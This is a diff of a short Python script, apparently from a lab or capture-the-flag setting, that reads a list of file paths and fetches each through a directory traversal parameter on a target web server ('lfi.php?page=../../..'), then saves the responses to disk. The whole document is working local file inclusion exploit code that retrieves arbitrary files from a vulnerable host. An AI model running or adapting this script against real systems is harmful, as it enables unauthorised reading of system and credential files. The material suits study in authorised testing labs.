@@ -2,7 +2,7 @@ import requests
 import os
 import time
 
-with open('/DATA/hacking/notes/chunks/lfi-files.md', 'r') as fd:
+with open('lfi-files.txt', 'r') as fd:
     path_list = list(fd)
 
 base_path = "172.16.1.10-"+str(time.time())
@@ -10,7 +10,7 @@ os.makedirs(base_path)
 
 for path in path_list:
     path = path.strip('\n')
-    r = requests.get('http://172.16.1.10/nav.php?page=../../../../../../../..'+path)
+    r = requests.get('http://10.10.10.10/lfi.php?page=../../../../../../../..'+path)
     if len(r.content) > 0:
         if "/" in path:
             folder_path = path.rsplit("/",1)[0]
